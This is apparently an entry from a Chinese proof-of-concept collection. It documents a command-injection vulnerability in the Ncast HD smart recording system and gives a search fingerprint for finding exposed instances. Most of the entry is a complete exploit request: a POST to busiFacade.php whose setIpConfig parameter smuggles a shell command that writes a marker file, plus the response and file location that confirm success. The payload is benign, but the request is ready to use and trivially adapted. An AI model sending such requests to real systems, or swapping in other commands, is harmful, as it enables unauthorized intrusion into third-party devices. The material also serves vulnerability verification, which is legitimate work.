﻿# Ncast 高清智能录播系统 命令执行漏洞

> 更新时间：2024-05-06

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app="Ncast-产品" && title=="高清智能录播系统"

> 验证脚本：HTTP

```

POST /classes/common/busiFacade.php HTTP/1.1
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=xxxxx
Connection: close

%7B%22name%22%3A%22setIpConfig%22%2C%22serviceName%22%3A%22SysManager%22%2C%22userTransaction%22%3Afalse%2C%22param%22%3A%5B%22%3Becho%20dudesuite%3E%3Edudesite.txt%22%2C%22255.255.252.0%22%2C%22192.168.7.1%22%2C%22202.96.128.86%22%2C%22192.168.89.89%22%2C%22255.255.252.0%22%5D%7D
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/classes/common/dudesite.txt

> 验证文件来源：Ncast 高清智能录播系统 命令执行漏洞.poc

